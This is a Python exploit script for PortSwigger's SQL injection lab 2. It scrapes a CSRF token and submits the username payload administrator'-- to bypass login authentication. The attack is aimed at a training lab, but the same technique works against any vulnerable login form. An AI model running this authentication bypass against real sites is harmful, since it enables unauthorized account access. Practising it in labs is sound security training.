# Portswigger SQLi labs 2
# http://portswigger.net/web-security/sql-injection

# Usage
#! python3 lab2.py <url> "<payload>"

# Example Usage
#! python3 lab2.py "https://0aef00e704afed97805da329003b0028.web-security-academy.net/login" "administrator'--"

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(s, url):
    # Get the CSRF token from the login page
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf


def exploit_sqli(s, url, payload):
    # Obtain the CSRF token
    csrf = get_csrf_token(s, url)
    # Prepare the login form data with the provided payload
    data = {"csrf": csrf,
            "username": payload,
            "password": "randomtext"}

    # Send the login POST request with the payload
    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text
    # Check if the response contains the string "Log out" to determine if the SQL injection is successful
    if "Log out" in res:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])

    s = requests.Session()

    # Call the exploit_sqli function with the provided URL and SQLi payload
    if exploit_sqli(s, url, sqli_payload):
        print(
            '[+] SQL injection successful! We have logged in as the administrator user.')
    else:
        print('[-] SQL injection unsuccessful.')
